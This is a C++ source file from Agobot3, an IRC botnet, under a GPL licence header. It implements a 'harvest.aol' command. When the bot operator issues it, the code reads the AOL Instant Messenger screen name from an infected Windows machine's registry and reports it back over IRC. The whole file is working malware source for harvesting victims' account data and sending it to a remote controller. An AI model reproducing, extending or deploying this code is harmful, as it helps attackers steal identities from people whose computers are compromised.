/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "mainctrl.h"
#include "harvest_aol.h"

void CHarvest_AOL::Init()
{	REGCMD(m_cmdAOL,	"harvest.aol",	"makes the bot get aol stuff",	false, this); }

bool CHarvest_AOL::HandleCommand(CMessage *pMsg)
{	if(!pMsg->sCmd.Compare("harvest.aol"))
	{
#ifdef WIN32
        
	    /* harvest aim sn - evilbyte */
		HKEY hRegKey;
	    if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\America Online\\AOL Instant Messenger (TM)\\CurrentVersion\\Login", 0, KEY_ALL_ACCESS, &hRegKey) != ERROR_SUCCESS)
		    return true;

	    char cAIM[256];
	    unsigned long type, length;

	    memset(cAIM, 0, sizeof(cAIM));
	    length = sizeof(cAIM);

	    if (RegQueryValueEx(hRegKey, "Screen Name", 0, &type, (BYTE *)cAIM, &length) != ERROR_SUCCESS)
		{
		    RegCloseKey(hRegKey);
		    return true;
		}

	    cAIM[length] = 0;
	    RegCloseKey(hRegKey);

	    g_pMainCtrl->m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "Found AIM sn (%s).", cAIM);

#endif // WIN32
	}
	
    return true; 
}
